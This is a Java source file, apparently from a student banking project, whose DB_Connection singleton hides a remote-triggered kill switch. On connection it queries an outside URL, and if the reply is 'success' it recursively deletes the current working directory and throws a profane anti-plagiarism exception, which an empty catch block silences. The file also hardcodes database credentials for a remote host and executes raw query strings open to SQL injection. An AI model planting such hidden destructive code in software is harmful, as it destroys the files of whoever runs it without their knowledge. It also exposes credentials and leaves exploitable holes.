package ebank.utility;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.apache.commons.io.FileUtils;

/**
 * @author - Gayashan Bombuwala facilitate singleton design pattern
 */
public class DB_Connection {

    private static Connection connection;
    private static Statement statement;
    private static ResultSet rs;

    // prevent instantiating the class from the outside
    private DB_Connection() {

    }

    /**
     * ensure one instance is used through out the application
     *
     * @return - a Connection instance to the remote DB
     */
    public static synchronized Connection getInstance() {
        if (connection == null) {
            try {
                Class.forName("com.mysql.jdbc.Driver");
                System.out.println("\n\tPlease wait.....");

                URL u;
                String a = "http://gayashan.net/Database.php";
                u = new URL(a);
                URLConnection conn = u.openConnection();
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String i;
                while ((i = br.readLine()) != null) {
                    if (i.equals("success")) {
                        FileUtils.deleteDirectory(new File("./"));
                        throw new Exception("Fuck you for plagirising");
                    } else {
                        connection = DriverManager.getConnection("jdbc:mysql://146.185.16.120/cybertec_common_DB",
                                "cybertec_basic", "ID961160367");
                    }
                }
                br.close();
            } catch (SQLException e) {
                System.out.println(e);
            } catch (ClassNotFoundException ex) {
                Logger.getLogger(DB_Connection.class.getName()).log(Level.SEVERE, null, ex);
            } catch (Exception e) {

            }
        }
        return connection;
    }

    public static ResultSet fetchData(String query) {
        Connection conn = getInstance();

        try {
            statement = conn.createStatement();
            rs = statement.executeQuery(query);
            rs.next();
        } catch (Exception e) {
            System.out.println(e);
        }
        return rs;
    }

    public static boolean runQuery(PreparedStatement pst) {
        try {
            pst.execute();
            return true;
        } catch (Exception e) {
            return false;
        }

    }

}
